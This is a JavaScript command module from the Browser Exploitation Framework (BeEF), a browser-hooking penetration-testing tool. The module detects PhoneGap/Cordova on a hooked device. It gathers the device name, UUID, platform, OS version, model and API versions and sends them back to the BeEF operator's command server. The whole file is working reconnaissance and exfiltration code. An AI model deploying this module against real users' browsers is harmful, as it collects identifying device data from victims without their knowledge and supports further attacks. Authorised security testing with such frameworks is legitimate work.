//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// detect phonegap
//
beef.execute(function() {

    var phonegap_details;

    try {
        phonegap_details = ""
        + " name: " + device.name 
        + " phonegap api: " + device.phonegap
        + " cordova api: " + device.cordova
        + " platform: " + device.platform
        + " uuid: " + device.uuid
        + " version: " + device.version
	+ " model: " + device.model;
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap=" + phonegap_details, beef.are.status_success());
    } catch(e) {
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unable to detect phonegap", beef.are.status_error());
    }
});
